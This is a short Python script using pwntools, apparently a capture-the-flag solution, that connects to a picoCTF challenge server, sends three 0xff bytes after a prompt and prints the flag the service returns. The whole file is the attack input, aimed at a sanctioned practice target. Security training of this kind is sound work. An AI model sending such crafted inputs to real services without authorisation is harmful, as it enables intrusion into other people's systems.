from pwn import *
io = remote("lonely-island.picoctf.net", 57089)
io.recvuntil(b"==>")
io.sendline(b"\xff\xff\xff")
flag = io.recvall()
print("\n"+flag.decode())